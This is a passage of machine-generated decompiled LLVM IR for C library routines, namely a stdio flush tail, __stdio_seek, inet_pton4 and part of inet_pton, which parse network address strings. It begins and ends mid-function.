  %v2_1c61c = load i8, i8* %v1_1c61c, align 1
  %v3_1c61c = zext i8 %v2_1c61c to i32
  store i32 %v3_1c61c, i32* %r2.global-to-local, align 4
  %v1_1c620 = add i32 %v0_1c61c, 1
  %v2_1c620 = inttoptr i32 %v1_1c620 to i8*
  %v3_1c620 = load i8, i8* %v2_1c620, align 1
  %v4_1c620 = zext i8 %v3_1c620 to i32
  %v4_1c624 = mul nuw nsw i32 %v3_1c61c, 256
  %v5_1c624 = or i32 %v4_1c620, %v4_1c624
  store i32 %v5_1c624, i32* %r3.global-to-local, align 4
  %v1_1c628 = and i32 %v4_1c620, 16
  store i32 %v1_1c628, i32* %r5.global-to-local, align 4
  %v2_1c628 = icmp eq i32 %v1_1c628, 0
  br i1 %v2_1c628, label %dec_label_pc_1c65c, label %dec_label_pc_1c630

dec_label_pc_1c630:                               ; preds = %dec_label_pc_1c604, %dec_label_pc_1c61c
  %v0_1c630 = call i32 @__GI___errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1c638 = inttoptr i32 %v0_1c630 to i32*
  store i32 9, i32* %v2_1c638, align 4
  br label %dec_label_pc_1c63c

dec_label_pc_1c63c:                               ; preds = %dec_label_pc_1c664, %dec_label_pc_1c630
  %v0_1c63c = load i32, i32* @r4, align 4
  %v1_1c63c = inttoptr i32 %v0_1c63c to i32*
  %v2_1c63c = load i32, i32* %v1_1c63c, align 4
  %v3_1c640 = udiv i32 %v2_1c63c, 65536
  %v1_1c644 = or i32 %v3_1c640, 8
  store i32 %v1_1c644, i32* %r3.global-to-local, align 4
  %v3_1c6481 = udiv i32 %v2_1c63c, 16777216
  store i32 %v3_1c6481, i32* %r2.global-to-local, align 4
  %v1_1c650 = trunc i32 %v3_1c6481 to i8
  %v3_1c650 = inttoptr i32 %v0_1c63c to i8*
  store i8 %v1_1c650, i8* %v3_1c650, align 1
  %v0_1c654 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c654 = trunc i32 %v0_1c654 to i8
  %v2_1c654 = load i32, i32* @r4, align 4
  %v3_1c654 = add i32 %v2_1c654, 1
  %v4_1c654 = inttoptr i32 %v3_1c654 to i8*
  store i8 %v1_1c654, i8* %v4_1c654, align 1
  %v2_1c658 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1c658, i32* @r4, align 4
  ret i32 -1

dec_label_pc_1c65c:                               ; preds = %dec_label_pc_1c61c
  %v1_1c65c = and i32 %v4_1c620, 64
  %v2_1c65c = icmp eq i32 %v1_1c65c, 0
  br i1 %v2_1c65c, label %dec_label_pc_1c690, label %dec_label_pc_1c664

dec_label_pc_1c664:                               ; preds = %dec_label_pc_1c65c
  %v0_1c664 = call i32 @__stdio_wcommit()
  %v2_1c668 = icmp eq i32 %v0_1c664, 0
  br i1 %v2_1c668, label %dec_label_pc_1c670, label %dec_label_pc_1c63c

dec_label_pc_1c670:                               ; preds = %dec_label_pc_1c664
  %v0_1c670 = load i32, i32* @r4, align 4
  %v1_1c670 = inttoptr i32 %v0_1c670 to i32*
  %v2_1c670 = load i32, i32* %v1_1c670, align 4
  %v3_1c674 = udiv i32 %v2_1c670, 65536
  %v1_1c678 = and i32 %v3_1c674, 65471
  store i32 %v1_1c678, i32* %r3.global-to-local, align 4
  %v1_1c67c = add i32 %v0_1c670, 8
  %v2_1c67c = inttoptr i32 %v1_1c67c to i32*
  %v3_1c67c = load i32, i32* %v2_1c67c, align 4
  store i32 %v3_1c67c, i32* %r2.global-to-local, align 4
  %v3_1c6802 = udiv i32 %v2_1c670, 16777216
  store i32 %v3_1c6802, i32* %r1.global-to-local, align 4
  %v2_1c684 = add i32 %v0_1c670, 28
  %v3_1c684 = inttoptr i32 %v2_1c684 to i32*
  store i32 %v3_1c67c, i32* %v3_1c684, align 4
  %v0_1c688 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c688 = trunc i32 %v0_1c688 to i8
  %v2_1c688 = load i32, i32* @r4, align 4
  %v3_1c688 = inttoptr i32 %v2_1c688 to i8*
  store i8 %v1_1c688, i8* %v3_1c688, align 1
  %v0_1c68c = load i32, i32* %r3.global-to-local, align 4
  %v1_1c68c = trunc i32 %v0_1c68c to i8
  %v2_1c68c = load i32, i32* @r4, align 4
  %v3_1c68c = add i32 %v2_1c68c, 1
  %v4_1c68c = inttoptr i32 %v3_1c68c to i8*
  store i8 %v1_1c68c, i8* %v4_1c68c, align 1
  %v0_1c690.pre = load i32, i32* @r4, align 4
  %v0_1c6a0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1c690

dec_label_pc_1c690:                               ; preds = %dec_label_pc_1c65c, %dec_label_pc_1c670
  %v0_1c6a0 = phi i32 [ 0, %dec_label_pc_1c65c ], [ %v0_1c6a0.pre, %dec_label_pc_1c670 ]
  %v2_1c6a4 = phi i32 [ %v0_1c61c, %dec_label_pc_1c65c ], [ %v0_1c690.pre, %dec_label_pc_1c670 ]
  %v1_1c690 = inttoptr i32 %v2_1c6a4 to i32*
  %v2_1c690 = load i32, i32* %v1_1c690, align 4
  %v3_1c694 = udiv i32 %v2_1c690, 65536
  %v1_1c698 = or i32 %v3_1c694, 1
  store i32 %v1_1c698, i32* %r3.global-to-local, align 4
  %v3_1c69c3 = udiv i32 %v2_1c690, 16777216
  store i32 %v3_1c69c3, i32* %r2.global-to-local, align 4
  %v1_1c6a4 = trunc i32 %v3_1c69c3 to i8
  %v3_1c6a4 = inttoptr i32 %v2_1c6a4 to i8*
  store i8 %v1_1c6a4, i8* %v3_1c6a4, align 1
  %v0_1c6a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c6a8 = trunc i32 %v0_1c6a8 to i8
  %v2_1c6a8 = load i32, i32* @r4, align 4
  %v3_1c6a8 = add i32 %v2_1c6a8, 1
  %v4_1c6a8 = inttoptr i32 %v3_1c6a8 to i8*
  store i8 %v1_1c6a8, i8* %v4_1c6a8, align 1
  %v2_1c6ac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1c6ac, i32* @r4, align 4
  ret i32 %v0_1c6a0

; uselistorder directives
  uselistorder i32 %v3_1c69c3, { 1, 0 }
  uselistorder i32 %v3_1c6481, { 1, 0 }
  uselistorder i32 %v4_1c620, { 1, 2, 0 }
  uselistorder i32 %v0_1c61c, { 0, 2, 1 }
  uselistorder i32 %v3_1c610, { 1, 0 }
  uselistorder i32 %v5_1c5f4, { 0, 2, 1, 3 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_1c690, { 1, 0 }
  uselistorder label %dec_label_pc_1c630, { 1, 0 }
  uselistorder label %dec_label_pc_1c61c, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_1c6b8 = add i32 %arg1, 4
  %v2_1c6b8 = inttoptr i32 %v1_1c6b8 to i32*
  %v3_1c6b8 = load i32, i32* %v2_1c6b8, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1c6c0 = load i32, i32* %arg2, align 4
  %v3_1c6c0 = add i32 %tmp, 4
  %v4_1c6c0 = inttoptr i32 %v3_1c6c0 to i32*
  %v5_1c6c0 = load i32, i32* %v4_1c6c0, align 4
  %v6_1c6c4 = call i32 @__GI_lseek64(i32 %v3_1c6b8, i32 %v2_1c6c0, i32 %v5_1c6c0, i32 %arg3)
  %v1_1c6c8 = icmp slt i32 %v6_1c6c4, 0
  br i1 %v1_1c6c8, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v3_1c6d0 = load i32, i32* @r4, align 4
  %v4_1c6d0 = inttoptr i32 %v3_1c6d0 to i32*
  store i32 %v6_1c6c4, i32* %v4_1c6d0, align 4
  %v6_1c6d0 = add i32 %v3_1c6d0, 4
  %v7_1c6d0 = inttoptr i32 %v6_1c6d0 to i32*
  store i32 %v2_1c6c0, i32* %v7_1c6d0, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v2_1c6c0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1c6e0 = load i32, i32* @r4, align 4
  %v6_1c6e0 = load i32, i32* @r5, align 4
  %v2_1c6e8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  store i32 %v2_1c6e8, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_1c7701 = load i32, i32* @r0, align 4
  %v1_1c7702 = inttoptr i32 %v0_1c7701 to i8*
  %v2_1c7703 = load i8, i8* %v1_1c7702, align 1
  %v3_1c7704 = zext i8 %v2_1c7703 to i32
  %v2_1c7745 = icmp eq i8 %v2_1c7703, 0
  store i1 %v2_1c7745, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c7745, label %dec_label_pc_1c780, label %dec_label_pc_1c710

dec_label_pc_1c710:                               ; preds = %entry, %dec_label_pc_1c770.backedge
  %v0_1c714 = phi i32 [ %v0_1c770, %dec_label_pc_1c770.backedge ], [ %v0_1c7701, %entry ]
  %v0_1c74c = phi i32 [ %v3_1c770, %dec_label_pc_1c770.backedge ], [ %v3_1c7704, %entry ]
  %v2_1c720.in = phi i32 [ %v3_1c770, %dec_label_pc_1c770.backedge ], [ %v3_1c7704, %entry ]
  %v2_1c720 = add nsw i32 %v2_1c720.in, -48
  %v2_1c710 = icmp ugt i32 %v2_1c720, 8
  %v7_1c710 = icmp eq i32 %v2_1c720, 9
  store i1 %v7_1c710, i1* %cpsr_z.global-to-local, align 1
  %v1_1c714 = add i32 %v0_1c714, 1
  store i32 %v1_1c714, i32* %r0.global-to-local, align 4
  %v2_1c718 = xor i1 %v7_1c710, true
  %v3_1c718 = and i1 %v2_1c710, %v2_1c718
  br i1 %v3_1c718, label %dec_label_pc_1c74c, label %dec_label_pc_1c71c

dec_label_pc_1c71c:                               ; preds = %dec_label_pc_1c710
  %v0_1c71c = load i32, i32* %r1.global-to-local, align 4
  %v1_1c71c = inttoptr i32 %v0_1c71c to i8*
  %v2_1c71c = load i8, i8* %v1_1c71c, align 1
  %v3_1c71c = zext i8 %v2_1c71c to i32
  %v0_1c720 = load i32, i32* %r7.global-to-local, align 4
  %v3_1c720 = mul i32 %v0_1c720, %v3_1c71c
  %v4_1c720 = add i32 %v3_1c720, %v2_1c720
  %v2_1c724 = icmp ugt i32 %v4_1c720, 254
  %v7_1c724 = icmp eq i32 %v4_1c720, 255
  store i1 %v7_1c724, i1* %cpsr_z.global-to-local, align 1
  %v2_1c728 = xor i1 %v7_1c724, true
  %v3_1c728 = and i1 %v2_1c724, %v2_1c728
  br i1 %v3_1c728, label %dec_label_pc_1c7a4, label %dec_label_pc_1c72c

dec_label_pc_1c72c:                               ; preds = %dec_label_pc_1c71c
  %v0_1c72c = load i32, i32* @lr, align 4
  %v2_1c72c = icmp eq i32 %v0_1c72c, 0
  store i1 %v2_1c72c, i1* %cpsr_z.global-to-local, align 1
  %v1_1c730 = trunc i32 %v4_1c720 to i8
  store i8 %v1_1c730, i8* %v1_1c71c, align 1
  %v0_1c734 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1c734, label %dec_label_pc_1c738, label %dec_label_pc_1c770.backedge

dec_label_pc_1c738:                               ; preds = %dec_label_pc_1c72c
  %v0_1c738 = load i32, i32* @ip, align 4
  %v1_1c738 = add i32 %v0_1c738, 1
  store i32 %v1_1c738, i32* @ip, align 4
  %v7_1c73c = icmp eq i32 %v1_1c738, 4
  store i1 %v7_1c73c, i1* %cpsr_z.global-to-local, align 1
  %v0_1c740 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1c740, i32* @lr, align 4
  %v8_1c744 = icmp sgt i32 %v1_1c738, 4
  br i1 %v8_1c744, label %dec_label_pc_1c7a4, label %dec_label_pc_1c770.backedge

dec_label_pc_1c74c:                               ; preds = %dec_label_pc_1c710
  %v1_1c754 = load i32, i32* @lr, align 4
  %v2_1c754 = urem i32 %v1_1c754, 2
  %v2_1c75820 = icmp eq i32 %v2_1c754, 0
  %not.v7_1c74c = icmp ne i32 %v0_1c74c, 46
  %v2_1c758 = or i1 %v2_1c75820, %not.v7_1c74c
  store i1 %v2_1c758, i1* %cpsr_z.global-to-local, align 1
  %v0_1c75c = load i32, i32* @r5, align 4
  store i32 %v0_1c75c, i32* @lr, align 4
  br i1 %v2_1c758, label %dec_label_pc_1c7a4, label %dec_label_pc_1c764

dec_label_pc_1c764:                               ; preds = %dec_label_pc_1c74c
  %v0_1c764 = load i32, i32* @ip, align 4
  %v7_1c764 = icmp eq i32 %v0_1c764, 4
  store i1 %v7_1c764, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c764, label %dec_label_pc_1c7a4, label %dec_label_pc_1c76c

dec_label_pc_1c76c:                               ; preds = %dec_label_pc_1c764
  %v1_1c76c = trunc i32 %v0_1c75c to i8
  %v2_1c76c = load i32, i32* %r1.global-to-local, align 4
  %v3_1c76c = add i32 %v2_1c76c, 1
  %v4_1c76c = inttoptr i32 %v3_1c76c to i8*
  store i8 %v1_1c76c, i8* %v4_1c76c, align 1
  %v5_1c76c = load i32, i32* %r1.global-to-local, align 4
  %v6_1c76c = add i32 %v5_1c76c, 1
  store i32 %v6_1c76c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1c770.backedge

dec_label_pc_1c770.backedge:                      ; preds = %dec_label_pc_1c76c, %dec_label_pc_1c72c, %dec_label_pc_1c738
  %v0_1c770 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c770 = inttoptr i32 %v0_1c770 to i8*
  %v2_1c770 = load i8, i8* %v1_1c770, align 1
  %v3_1c770 = zext i8 %v2_1c770 to i32
  %v2_1c774 = icmp eq i8 %v2_1c770, 0
  store i1 %v2_1c774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c774, label %dec_label_pc_1c770.dec_label_pc_1c780_crit_edge, label %dec_label_pc_1c710

dec_label_pc_1c770.dec_label_pc_1c780_crit_edge:  ; preds = %dec_label_pc_1c770.backedge
  %v0_1c780.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1c780

dec_label_pc_1c780:                               ; preds = %dec_label_pc_1c770.dec_label_pc_1c780_crit_edge, %entry
  %v0_1c780 = phi i32 [ %v0_1c780.pre, %dec_label_pc_1c770.dec_label_pc_1c780_crit_edge ], [ 0, %entry ]
  %v7_1c780 = icmp eq i32 %v0_1c780, 3
  store i1 %v7_1c780, i1* %cpsr_z.global-to-local, align 1
  %v7_1c784 = icmp slt i32 %v0_1c780, 4
  br i1 %v7_1c784, label %dec_label_pc_1c7a4, label %dec_label_pc_1c788

dec_label_pc_1c788:                               ; preds = %dec_label_pc_1c780
  %v0_1c788 = load i32, i32* @r4, align 4
  store i32 %v0_1c788, i32* @r0, align 4
  store i32 %v2_1c6e8, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1c794 = call i32 @memcpy()
  br label %dec_label_pc_1c7a4

dec_label_pc_1c7a4:                               ; preds = %dec_label_pc_1c71c, %dec_label_pc_1c738, %dec_label_pc_1c74c, %dec_label_pc_1c764, %dec_label_pc_1c780, %dec_label_pc_1c788
  %storemerge = phi i32 [ 1, %dec_label_pc_1c788 ], [ 0, %dec_label_pc_1c780 ], [ 0, %dec_label_pc_1c764 ], [ 0, %dec_label_pc_1c74c ], [ 0, %dec_label_pc_1c738 ], [ 0, %dec_label_pc_1c71c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_1c6e0, i32* @r4, align 4
  store i32 %v6_1c6e0, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1c780, { 1, 0 }
  uselistorder i32 %v3_1c770, { 1, 0 }
  uselistorder i32 %v0_1c770, { 1, 0 }
  uselistorder i32 %v2_1c720, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder label %dec_label_pc_1c7a4, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1c770.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1c710, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1c7ac = load i32, i32* @r4, align 4
  %v6_1c7ac = load i32, i32* @r5, align 4
  %v9_1c7ac = load i32, i32* @r6, align 4
  %v12_1c7ac = load i32, i32* @r7, align 4
  %v7_1c7b0 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg3, i32* %stack_var_-56, align 4
  br i1 %v7_1c7b0, label %dec_label_pc_1c7d0, label %dec_label_pc_1c7c4

dec_label_pc_1c7c4:                               ; preds = %entry
  %v7_1c7c4 = icmp eq i32 %arg1, 10
  br i1 %v7_1c7c4, label %dec_label_pc_1c7e0, label %dec_label_pc_1c98c

dec_label_pc_1c7d0:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_1c7d8 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_1c99c

dec_label_pc_1c7e0:                               ; preds = %dec_label_pc_1c7c4
  %v2_1c7e0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_1c7ec = bitcast i32* %stack_var_-52 to i8*
  %v3_1c7ec = call i32 @__GI_memset(i8* %v2_1c7ec, i32 0)
  %v0_1c7f0 = load i32, i32* @r5, align 4
  %v1_1c7f0 = inttoptr i32 %v0_1c7f0 to i8*
  %v2_1c7f0 = load i8, i8* %v1_1c7f0, align 1
  %v3_1c7f0 = zext i8 %v2_1c7f0 to i32
  store i32 %v3_1c7f0, i32* %r3.global-to-local, align 4
  %v7_1c7f4 = icmp eq i8 %v2_1c7f0, 58
  store i32 %v3_1c7ec, i32* @r6, align 4
  %v2_1c7fc = add i32 %v3_1c7ec, 16
  store i32 %v2_1c7fc, i32* %r8.global-to-local, align 4
  br i1 %v7_1c7f4, label %dec_label_pc_1c804, label %dec_label_pc_1c810

dec_label_pc_1c804:                               ; preds = %dec_label_pc_1c7e0
  %v1_1c804 = add i32 %v0_1c7f0, 1
  %v2_1c804 = inttoptr i32 %v1_1c804 to i8*
  %v3_1c804 = load i8, i8* %v2_1c804, align 1
  %v4_1c804 = zext i8 %v3_1c804 to i32
  store i32 %v4_1c804, i32* %r3.global-to-local, align 4
  store i32 %v1_1c804, i32* @r5, align 4
  %v7_1c808 = icmp eq i8 %v3_1c804, 58
  br i1 %v7_1c808, label %dec_label_pc_1c810, label %dec_label_pc_1c984

dec_label_pc_1c810:                               ; preds = %dec_label_pc_1c804, %dec_label_pc_1c7e0
  %v0_1c814 = phi i32 [ %v1_1c804, %dec_label_pc_1c804 ], [ %v0_1c7f0, %dec_label_pc_1c7e0 ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_1c814, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v1_1c8e83 = inttoptr i32 %v0_1c814 to i8*
  %v2_1c8e84 = load i8, i8* %v1_1c8e83, align 1
  %v3_1c8e85 = zext i8 %v2_1c8e84 to i32
  store i32 %v3_1c8e85, i32* @r4, align 4
  %v2_1c8ec6 = icmp eq i8 %v2_1c8e84, 0
  br i1 %v2_1c8ec6, label %dec_label_pc_1c8f4.thread, label %dec_label_pc_1c824

dec_label_pc_1c8f4.thread:                        ; preds = %dec_label_pc_1c810
  store i32 %v3_1c7ec, i32* @r4, align 4
  br label %dec_label_pc_1c920

dec_label_pc_1c824:                               ; preds = %dec_label_pc_1c810, %dec_label_pc_1c8e8.backedge
  %v0_1c828 = phi i32 [ %v3_1c8e8, %dec_label_pc_1c8e8.backedge ], [ %v3_1c8e85, %dec_label_pc_1c810 ]
  %v1_1c828 = or i32 %v0_1c828, 32
  store i32 %v1_1c828, i32* %r1.global-to-local, align 4
  %v3_1c82c = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_25734.1707 to i32), i32 %v1_1c828)
  %v2_1c830 = icmp eq i32 %v3_1c82c, 0
  %v0_1c834 = load i32, i32* @r5, align 4
  %v1_1c834 = add i32 %v0_1c834, 1
  store i32 %v1_1c834, i32* @r5, align 4
  br i1 %v2_1c830, label %dec_label_pc_1c858, label %dec_label_pc_1c83c

dec_label_pc_1c83c:                               ; preds = %dec_label_pc_1c824
  store i32 ptrtoint ([17 x i8]* @global_var_25734.1707 to i32), i32* %r2.global-to-local, align 4
  %v2_1c840 = sub i32 %v3_1c82c, ptrtoint ([17 x i8]* @global_var_25734.1707 to i32)
  %v1_1c844 = load i32, i32* @r7, align 4
  %v4_1c844 = mul i32 %v1_1c844, 16
  %v5_1c844 = or i32 %v4_1c844, %v2_1c840
  store i32 %v5_1c844, i32* @r7, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %tmp34 = icmp ult i32 %v5_1c844, 65536
  br i1 %tmp34, label %dec_label_pc_1c8e4, label %dec_label_pc_1c984

dec_label_pc_1c858:                               ; preds = %dec_label_pc_1c824
  %v0_1c858 = load i32, i32* @r4, align 4
  %v7_1c858 = icmp eq i32 %v0_1c858, 58
  br i1 %v7_1c858, label %dec_label_pc_1c860, label %dec_label_pc_1c8b8

dec_label_pc_1c860:                               ; preds = %dec_label_pc_1c858
  %v0_1c860 = load i32, i32* %sb.global-to-local, align 4
  %v2_1c860 = icmp eq i32 %v0_1c860, 0
  br i1 %v2_1c860, label %dec_label_pc_1c868, label %dec_label_pc_1c87c

dec_label_pc_1c868:                               ; preds = %dec_label_pc_1c860
  %v0_1c868 = load i32, i32* %fp.global-to-local, align 4
  %v2_1c868 = icmp eq i32 %v0_1c868, 0
  br i1 %v2_1c868, label %dec_label_pc_1c870, label %dec_label_pc_1c984

dec_label_pc_1c870:                               ; preds = %dec_label_pc_1c868
  %v0_1c870 = load i32, i32* @r6, align 4
  store i32 %v0_1c870, i32* %fp.global-to-local, align 4
  store i32 %v1_1c834, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1c8e8.backedge

dec_label_pc_1c87c:                               ; preds = %dec_label_pc_1c860
  %v1_1c87c = inttoptr i32 %v1_1c834 to i8*
  %v2_1c87c = load i8, i8* %v1_1c87c, align 1
  %v3_1c87c = zext i8 %v2_1c87c to i32
  store i32 %v3_1c87c, i32* %r3.global-to-local, align 4
  %v2_1c880 = icmp eq i8 %v2_1c87c, 0
  br i1 %v2_1c880, label %dec_label_pc_1c984, label %dec_label_pc_1c888

dec_label_pc_1c888:                               ; preds = %dec_label_pc_1c87c
  %v0_1c888 = load i32, i32* @r6, align 4
  %v1_1c888 = add i32 %v0_1c888, 2
  store i32 %v1_1c888, i32* %r3.global-to-local, align 4
  %v1_1c88c = load i32, i32* %r8.global-to-local, align 4
  %tmp35 = icmp ugt i32 %v1_1c888, %v1_1c88c
  br i1 %tmp35, label %dec_label_pc_1c984, label %dec_label_pc_1c894

dec_label_pc_1c894:                               ; preds = %dec_label_pc_1c888
  %v0_1c894 = load i32, i32* @r7, align 4
  %v3_1c894 = udiv i32 %v0_1c894, 256
  store i32 %v3_1c894, i32* %r2.global-to-local, align 4
  store i32 %v0_1c888, i32* %r3.global-to-local, align 4
  %v1_1c89c = trunc i32 %v3_1c894 to i8
  %v3_1c89c = inttoptr i32 %v0_1c888 to i8*
  store i8 %v1_1c89c, i8* %v3_1c89c, align 1
  %v4_1c89c = load i32, i32* %r3.global-to-local, align 4
  %v5_1c89c = add i32 %v4_1c89c, 1
  store i32 %v5_1c89c, i32* %r3.global-to-local, align 4
  %v0_1c8a0 = load i32, i32* @r7, align 4
  %v1_1c8a0 = trunc i32 %v0_1c8a0 to i8
  %v2_1c8a0 = load i32, i32* @r6, align 4
  %v3_1c8a0 = add i32 %v2_1c8a0, 1
  %v4_1c8a0 = inttoptr i32 %v3_1c8a0 to i8*
  store i8 %v1_1c8a0, i8* %v4_1c8a0, align 1
  store i32 0, i32* @r7, align 4
  %v0_1c8a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c8a8 = add i32 %v0_1c8a8, 1
  store i32 %v1_1c8a8, i32* @r6, align 4
  %v0_1c8ac = load i32, i32* @r5, align 4
  store i32 %v0_1c8ac, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1c8e8.backedge

dec_label_pc_1c8b8:                               ; preds = %dec_label_pc_1c858
  %v7_1c8b8 = icmp eq i32 %v0_1c858, 46
  br i1 %v7_1c8b8, label %dec_label_pc_1c8c0, label %dec_label_pc_1c984

dec_label_pc_1c8c0:                               ; preds = %dec_label_pc_1c8b8
  %v0_1c8c0 = load i32, i32* @r6, align 4
  %v1_1c8c0 = add i32 %v0_1c8c0, 4
  store i32 %v1_1c8c0, i32* @r4, align 4
  %v1_1c8c4 = load i32, i32* %r8.global-to-local, align 4
  %tmp36 = icmp ugt i32 %v1_1c8c0, %v1_1c8c4
  br i1 %tmp36, label %dec_label_pc_1c984, label %dec_label_pc_1c8cc

dec_label_pc_1c8cc:                               ; preds = %dec_label_pc_1c8c0
  %v0_1c8cc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_1c8cc, i32* @r0, align 4
  store i32 %v0_1c8c0, i32* %r1.global-to-local, align 4
  %v3_1c8d4 = call i32 @inet_pton4(i32 %v0_1c8cc, i32 %v0_1c8c0)
  %v5_1c8dc = icmp sgt i32 %v3_1c8d4, 0
  br i1 %v5_1c8dc, label %dec_label_pc_1c8cc.dec_label_pc_1c920_crit_edge, label %dec_label_pc_1c984

dec_label_pc_1c8cc.dec_label_pc_1c920_crit_edge:  ; preds = %dec_label_pc_1c8cc
  %v0_1c964.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1c920

dec_label_pc_1c8e4:                               ; preds = %dec_label_pc_1c83c
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1c8e8.backedge

dec_label_pc_1c8e8.backedge:                      ; preds = %dec_label_pc_1c8e4, %dec_label_pc_1c870, %dec_label_pc_1c894
  %v0_1c8e8 = phi i32 [ %v1_1c834, %dec_label_pc_1c8e4 ], [ %v1_1c834, %dec_label_pc_1c870 ], [ %v0_1c8ac, %dec_label_pc_1c894 ]
  %v0_1c8f411 = phi i32 [ 1, %dec_label_pc_1c8e4 ], [ 0, %dec_label_pc_1c870 ], [ 0, %dec_label_pc_1c894 ]
  %v1_1c8e8 = inttoptr i32 %v0_1c8e8 to i8*
  %v2_1c8e8 = load i8, i8* %v1_1c8e8, align 1
  %v3_1c8e8 = zext i8 %v2_1c8e8 to i32
  store i32 %v3_1c8e8, i32* @r4, align 4
  %v2_1c8ec = icmp eq i8 %v2_1c8e8, 0
  br i1 %v2_1c8ec, label %dec_label_pc_1c8f4, label %dec_label_pc_1c824

dec_label_pc_1c8f4:                               ; preds = %dec_label_pc_1c8e8.backedge
  %v0_1c8f8.pre = load i32, i32* @r6, align 4
  %v2_1c8f4 = icmp eq i32 %v0_1c8f411, 0
  store i32 %v0_1c8f8.pre, i32* @r4, align 4
  br i1 %v2_1c8f4, label %dec_label_pc_1c920, label %dec_label_pc_1c900

dec_label_pc_1c900:                               ; preds = %dec_label_pc_1c8f4
  %v1_1c900 = add i32 %v0_1c8f8.pre, 2
  store i32 %v1_1c900, i32* %r3.global-to-local, align 4
  %v1_1c904 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_1c900, %v1_1c904
  br i1 %tmp37, label %dec_label_pc_1c984, label %dec_label_pc_1c90c

dec_label_pc_1c90c:                               ; preds = %dec_label_pc_1c900
  store i32 %v0_1c8f8.pre, i32* %r3.global-to-local, align 4
  %v0_1c910 = load i32, i32* @r7, align 4
  %v3_1c910 = udiv i32 %v0_1c910, 256
  store i32 %v3_1c910, i32* %r2.global-to-local, align 4
  %v1_1c914 = trunc i32 %v3_1c910 to i8
  %v3_1c914 = inttoptr i32 %v0_1c8f8.pre to i8*
  store i8 %v1_1c914, i8* %v3_1c914, align 1
  %v4_1c914 = load i32, i32* %r3.global-to-local, align 4
